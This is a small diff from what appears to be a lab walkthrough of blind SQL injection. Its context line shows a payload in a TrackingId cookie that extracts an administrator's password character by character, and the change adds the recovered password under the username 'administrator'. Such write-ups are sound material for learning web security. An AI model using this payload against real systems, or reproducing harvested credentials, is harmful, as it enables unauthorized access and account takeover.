@@ -69,7 +69,7 @@ TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='a
 ## after getting password login as a administrator
 ```
 administrator
-
+gtoq6awgqkpq08zp2yad
 ```
 
 
